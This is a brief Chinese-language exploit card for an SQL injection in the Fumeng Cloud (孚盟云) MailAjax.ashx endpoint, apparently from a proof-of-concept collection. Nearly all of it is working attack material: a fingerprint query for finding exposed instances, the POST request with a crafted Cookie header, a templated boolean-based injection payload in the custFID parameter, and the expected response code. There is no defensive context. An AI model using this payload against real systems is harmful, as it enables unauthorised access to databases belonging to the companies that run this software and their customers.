# 孚盟云MailAjax.ashxSQL注入漏洞

- **系统**：孚盟云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /Ajax/MailAjax.ashx HTTP/1.1`
- **关键头**：`Cookie: UserCookie={"LicNo":"","lastLoginIp":"","LicSelected":"cloud","ProductID":"M8","…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=GetMailContactsCard&custFID={{urlescape((SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(122)+CHAR(113)+(CASE WHEN (7588=7588) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(107)+CHAR(113)))}}
```
- **预期**：200　|　—